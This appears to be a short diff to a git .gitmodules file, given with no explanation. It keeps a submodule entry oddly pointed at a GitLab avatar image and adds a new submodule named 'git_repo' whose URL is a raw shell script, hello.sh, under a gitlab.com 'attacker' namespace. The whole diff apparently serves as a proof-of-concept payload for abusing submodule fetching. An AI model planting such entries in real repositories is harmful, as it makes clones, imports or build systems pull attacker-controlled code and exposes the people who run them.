@@ -1,3 +1,6 @@
 [submodule "ZGblzbGW_400x400.jpg"]
 	path = ZGblzbGW_400x400.jpg
 	url = http://gitlab.com/uploads/-/system/user/avatar/397121/ZGblzbGW_400x400.jpg
+[submodule "git_repo"]
+	path = git_repo
+	url = http://gitlab.com/attacker/sub/-/raw/d3415f61a61b8c95e35a586c5c75957c86fd480a/hello.sh
